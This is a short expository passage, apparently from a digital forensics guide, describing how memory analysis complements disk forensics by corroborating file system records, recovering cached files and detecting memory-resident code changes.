Memory analysis complements disk forensics in powerful ways. It provides you with a corroborating source of evidence regarding files on the file system (MFT records) and their timestamps. Additionally, memory contains recently accessed file content, giving you the ability to dump any files cached by the operating system, detect memory-resident code modifications, and extract unencrypted portions of sensitive files on encrypted volumes. We still recommend acquiring forensic disk images (when possible); however, you’ll often find that a memory sample is all you need to gather the necessary evidence that has traditionally been available only via disk forensics.
